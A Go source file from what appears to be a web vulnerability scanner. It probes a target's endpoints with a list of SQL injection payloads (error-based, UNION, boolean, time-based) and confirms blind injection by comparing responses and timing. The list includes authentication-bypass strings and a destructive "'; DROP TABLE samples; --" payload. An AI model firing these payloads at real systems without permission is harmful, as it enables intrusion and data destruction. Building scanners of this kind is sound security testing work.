package tests

import (
	"fmt"
	"io"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/versaSecurityTest/internal/config"
)

// AdvancedSQLInjectionTest - Test agresivo y completo de SQL Injection
type AdvancedSQLInjectionTest struct {
	Discovery *DiscoveryResult
}

// Run ejecuta tests exhaustivos de SQL injection
func (t *AdvancedSQLInjectionTest) Run(targetURL string, client HTTPClient, payloads *config.PayloadConfig) TestResult {
	result := TestResult{
		TestName:    "Advanced SQL Injection Test",
		Status:      "Passed",
		Description: "No se detectaron vulnerabilidades de inyección SQL",
		Severity:    "None",
		Details:     []string{},
		Evidence:    []Evidence{},
	}

	// PAYLOADS EXHAUSTIVOS
	sqlPayloads := []string{
		// Básicos y Errores
		"'", "''", "\"", "\"\"", "`)", "'))",
		// Union Based
		"' UNION SELECT null,null,null--",
		"' UNION SELECT 1,2,3--",
		"\" UNION SELECT null,null,null--",
		// Boolean Based (Logic)
		"' AND 1=1--", "' AND 1=2--",
		"\" AND 1=1--", "\" AND 1=2--",
		"' OR '1'='1", "\" OR \"1\"=\"1",
		// Time Based
		"'; WAITFOR DELAY '00:00:05'--",               // MSSQL
		"'; SELECT pg_sleep(5)--",                     // PostgreSQL
		"' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", // MySQL
		"\" AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
		// DB Specific / Advanced
		"admin'--", "admin' #", "' OR 1=1#", "' OR 1=1/*",
		"'; DROP TABLE samples; --",
	}

	var endpointsToTest []string
	var paramsToTest []string

	if t.Discovery != nil && len(t.Discovery.Endpoints) > 0 {
		for _, info := range t.Discovery.Endpoints {
			for _, method := range info.Methods {
				if method == "GET" {
					endpointsToTest = append(endpointsToTest, info.Path)
					paramsToTest = append(paramsToTest, info.Params...)
				}
			}
		}
	} else {
		// Fallback si no hay descubrimiento
		endpointsToTest = []string{"/", "/login", "/search", "/api/user", "/products", "/category"}
		paramsToTest = []string{"id", "user", "q", "query", "cat", "search"}
	}

	var wg sync.WaitGroup
	var mu sync.Mutex
	var vulnerabilitiesFound int

	// Limitar concurrencia interna por test para no saturar totalmente
	semaphore := make(chan struct{}, 5)

	// Fase 1: detección por error (patrones reales de error de BD en la respuesta), concurrente.
	for _, endpoint := range endpointsToTest {
		for _, param := range paramsToTest {
			for _, payload := range sqlPayloads {
				wg.Add(1)
				go func(e, p, pay string) {
					defer wg.Done()
					semaphore <- struct{}{}
					defer func() { <-semaphore }()

					testURL := fmt.Sprintf("%s%s?%s=%s", targetURL, e, p, url.QueryEscape(pay))
					resp, err := client.Get(testURL)
					if err != nil {
						return
					}
					bodyBytes, _ := io.ReadAll(resp.Body)
					resp.Body.Close()
					if IsRateLimited(resp.StatusCode) {
						return
					}

					vuln := t.analyzeResponse(resp.StatusCode, string(bodyBytes), 0, pay)
					if vuln.IsVulnerable {
						mu.Lock()
						vulnerabilitiesFound++
						result.Evidence = append(result.Evidence, Evidence{
							Type:        "SQL Injection",
							URL:         testURL,
							Payload:     pay,
							StatusCode:  resp.StatusCode,
							Response:    vuln.Evidence,
							Description: vuln.Description,
							Severity:    vuln.Severity,
						})
						mu.Unlock()
					}
				}(endpoint, param, payload)
			}
		}
	}

	wg.Wait()

	// Fase 2: detección ciega (boolean y time-based), secuencial y con control, para que sea fiable.
	for _, endpoint := range endpointsToTest {
		for _, param := range paramsToTest {
			if v := t.checkBlind(client, targetURL, endpoint, param); v != nil {
				vulnerabilitiesFound++
				result.Evidence = append(result.Evidence, *v)
			}
		}
	}

	if vulnerabilitiesFound > 0 {
		result.Status = "Failed"
		result.Severity = "Critical"
		result.Description = fmt.Sprintf("CRÍTICO: Se detectaron %d vulnerabilidades de SQL injection avanzadas", vulnerabilitiesFound)
	}

	return result
}

// SQLVulnerability estructura para análisis de vulnerabilidades
type SQLVulnerability struct {
	IsVulnerable bool
	Description  string
	Evidence     string
	Severity     string
}

// analyzeResponse analiza la respuesta en busca de indicadores de SQL injection (Base)
func (t *AdvancedSQLInjectionTest) analyzeResponse(statusCode int, responseText string, responseTime time.Duration, payload string) SQLVulnerability {
	responseLower := strings.ToLower(responseText)

	// PATRONES DE ERROR SQL EXPANDIDOS
	sqlErrorPatterns := []struct {
		pattern  string
		database string
		severity string
	}{
		// MySQL / MariaDB
		{"you have an error in your sql syntax", "MariaDB/MySQL", "Critical"},
		{"warning: mysql_", "MySQL", "High"},
		{"valid mysql result", "MySQL", "High"},
		{"check the manual that corresponds to your mariadb server version", "MariaDB", "Critical"},

		// MSSQL
		{"microsoft ole db provider for sql server", "MSSQL", "Critical"},
		{"unclosed quotation mark after the character string", "MSSQL", "Critical"},
		{"incorrect syntax near", "MSSQL", "Critical"},
		{"sql server error", "MSSQL", "High"},

		// SQLite
		{"sqlite3::query", "SQLite", "High"},
		{"sqlite_error", "SQLite", "High"},
		{"sqlsyntaxerror: near", "SQLite", "Critical"},

		// PostgreSQL
		{"invalid input syntax for type", "PostgreSQL", "Critical"},
		{"unterminated quoted string", "PostgreSQL", "Critical"},
		{"postgresql query failed", "PostgreSQL", "High"},

		// Generic
		{"sql syntax", "Generic", "High"},
		{"database error", "Generic", "Medium"},
		{"internal server error", "Generic", "Low"}, // Solo si el payload disparó el error
	}

	// Buscar patrones de error. El timing-based NO se evalúa aquí (una respuesta lenta puede deberse al
	// servidor o al backoff); se confirma aparte en checkBlind con una petición de control.
	for _, pattern := range sqlErrorPatterns {
		if strings.Contains(responseLower, pattern.pattern) {
			return SQLVulnerability{
				IsVulnerable: true,
				Description:  fmt.Sprintf("Inyección SQL detectable por error (%s)", pattern.database),
				Evidence:     fmt.Sprintf("Patrón '%s' con payload '%s'", pattern.pattern, payload),
				Severity:     pattern.severity,
			}
		}
	}

	return SQLVulnerability{IsVulnerable: false}
}

// fetchBody hace un GET y devuelve estado, cuerpo y cuánto tardó. Vacío si hay error o rate limit.
func (t *AdvancedSQLInjectionTest) fetchBody(client HTTPClient, url string) (int, string, time.Duration, bool) {
	start := time.Now()
	resp, err := client.Get(url)
	if err != nil {
		return 0, "", 0, false
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if IsRateLimited(resp.StatusCode) {
		return resp.StatusCode, "", time.Since(start), false
	}
	return resp.StatusCode, string(body), time.Since(start), true
}

// diffRatio es la fracción de diferencia de longitud entre dos cuerpos (0 = iguales, 1 = totalmente distintos).
func diffRatio(a, b string) float64 {
	la, lb := len(a), len(b)
	if la == 0 && lb == 0 {
		return 0
	}
	maxLen := la
	if lb > maxLen {
		maxLen = lb
	}
	d := la - lb
	if d < 0 {
		d = -d
	}
	return float64(d) / float64(maxLen)
}

// checkBlind confirma inyección ciega de forma fiable:
//   - Boolean: una condición verdadera deja la página como la base y una falsa la cambia de verdad.
//   - Time-based: el payload con SLEEP tarda bastante MÁS que una petición de control (no es lentitud general).
//
// Devuelve una evidencia solo si lo confirma; nil en caso contrario.
func (t *AdvancedSQLInjectionTest) checkBlind(client HTTPClient, targetURL, endpoint, param string) *Evidence {
	q := func(payload string) string {
		return fmt.Sprintf("%s%s?%s=%s", targetURL, endpoint, param, url.QueryEscape(payload))
	}

	// Base: el parámetro con un valor normal. Si no da 2xx, el endpoint/param no sirve para probar.
	baseCode, baseBody, baseTime, ok := t.fetchBody(client, q("1"))
	if !ok || !IsAccessible(baseCode) {
		return nil
	}

	// Boolean: comparar verdadero (1=1) vs falso (1=2). Se prueban variantes con y sin comillas.
	for _, pair := range [][2]string{
		{"1' AND '1'='1", "1' AND '1'='2"},
		{"1 AND 1=1", "1 AND 1=2"},
	} {
		trueCode, trueBody, _, okT := t.fetchBody(client, q(pair[0]))
		falseCode, falseBody, _, okF := t.fetchBody(client, q(pair[1]))
		if !okT || !okF || !IsAccessible(trueCode) || !IsAccessible(falseCode) {
			continue
		}
		// Verdadero ≈ base (la condición siempre cierta no cambia el resultado) y falso difiere de verdad
		if diffRatio(baseBody, trueBody) < 0.1 && diffRatio(trueBody, falseBody) > 0.3 {
			return &Evidence{
				Type:        "SQL Injection",
				URL:         q(pair[1]),
				Payload:     pair[1],
				StatusCode:  falseCode,
				Response:    fmt.Sprintf("Boolean-based: verdadero y falso devuelven páginas distintas (diff %.0f%%)", diffRatio(trueBody, falseBody)*100),
				Description: "Inyección SQL ciega basada en booleanos",
				Severity:    "Critical",
			}
		}
	}

	// Time-based: el control (sin sleep) debe ser rápido y el sleep notablemente más lento.
	_, _, controlTime, okC := t.fetchBody(client, q("1' AND '1'='1"))
	if !okC || controlTime > 2*time.Second || baseTime > 2*time.Second {
		return nil // la web ya es lenta de por sí: no se puede concluir por tiempo
	}
	for _, sleepPayload := range []string{"1' AND SLEEP(3)-- ", "1'; SELECT pg_sleep(3)-- ", "1 AND SLEEP(3)"} {
		_, _, sleepTime, okS := t.fetchBody(client, q(sleepPayload))
		if okS && sleepTime >= controlTime+2500*time.Millisecond {
			return &Evidence{
				Type:        "SQL Injection",
				URL:         q(sleepPayload),
				Payload:     sleepPayload,
				StatusCode:  200,
				Response:    fmt.Sprintf("Time-based: control %v vs sleep %v (el payload induce el retardo)", controlTime.Round(time.Millisecond), sleepTime.Round(time.Millisecond)),
				Description: "Inyección SQL ciega basada en tiempo",
				Severity:    "Critical",
			}
		}
	}
	return nil
}
